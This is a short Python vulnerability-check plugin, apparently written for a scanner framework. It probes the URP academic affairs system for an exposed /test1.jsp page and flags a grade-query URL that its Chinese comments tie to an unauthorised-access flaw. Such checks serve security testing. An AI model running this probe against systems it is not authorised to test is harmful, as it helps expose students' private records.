#!/usr/bin/env python
# -*- coding: utf-8 -*-
#URP教务系统越权查询漏洞(需登录)
#存在文件：/test1.jsp(成绩查询文件：/jmglAction.do?oper=xsmdcx)
#__author__ = 'range'

def assign(service, arg):
    if service == "urp":
        return True, arg

def audit(arg):
    url = arg
    payload = 'test1.jsp'
    verify_url = url +  payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if code == 200:
        security_info(verify_url)
        security_info(url + 'jmglAction.do?oper=xsmdcx(This url need to login in)')

if __name__ == '__main__':
    from dummy import *
    audit(assign('urp', 'http://www.example.com/')[1])
